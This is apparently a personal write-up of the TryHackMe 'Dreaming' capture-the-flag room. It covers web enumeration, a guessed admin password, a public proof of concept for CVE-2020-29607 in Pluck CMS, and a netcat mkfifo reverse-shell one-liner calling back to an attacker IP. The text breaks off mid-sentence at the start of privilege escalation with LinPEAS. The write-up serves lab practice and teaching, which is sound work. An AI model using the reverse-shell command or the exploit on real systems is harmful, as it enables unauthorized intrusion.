# THM-Dreaming
Personal attempt on THM CTF Challenge

RECON 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/084772cd-94f9-46ba-b317-6d805eaa61e6)

Access the target's website, we can only see Apache's default site. Let's do some directory enumeration with nmap and http-enum script. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/016a5d24-38de-470c-8170-120b0a79eab5)

Accessing the directoy, we know that the web is using Pluck CMS 4.7.13

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/48925c1d-2d60-4869-903a-3c3c75efb00a)

EXPLOIT

Upon a quick Google search, we can tell that this version of Pluck is vulnerable to an Authenticated File Upload, as documented in CVE-2020-29607. However, first we need to authenticate. 
With some luck, I was able to guess the password. It's password (not very secured 🔒)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/944c85b0-9e3d-4599-aeaa-10cd9273ee47)

The mentioned vulnerability allows an attacker to upload a web shell to the directory http://IP/admin.php?action=files to gain a webshell. This abuses the "manage files" functionality of the app.
I use this PoC from Github: https://github.com/0xAbbarhSF/CVE-2020-29607
Usage: python3 exploit.py TARGET IP TARGET PORT password pluck-cms-path

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5b4795d2-805a-4e65-b5ba-a046e22eeafc)

Now, for more control and convenience, we want a reverse shell. I personally like to use the methods from
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

On your attack machine, start a Netcat listener on a random unused port.
nc -lvnp 1234

Then run this on the webshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
Remember to replace the IP with the IP of your attack machine. 

Wait a few a moment, then we receive a shell of the target machine as www-data. www-data is the owner of files under the web server directory.  

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/325565e4-6740-4f61-be04-977d00d318bb)

To gain a more stable shell, we can use the command:
python3 -c 'import pty;pty.spawn("/bin/bash")

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/d7cd8071-55ff-47ed-b56e-42da593972ef)

PRIVILEGE ESCALATION


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5e59087c-b25e-49f9-97dd-7ad1978fe37c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/07a3dbb9-dee1-4bae-aaf0-164eac7ab22e)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/eac83ba7-0d52-4a95-aa16-d7d46a750ad8)

As you can see, www-data don't have read access to the flags so, in order to get the flags, we need to find ways to escalate to higher privileges. I am using [LinPeas]([url](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
Script is avi






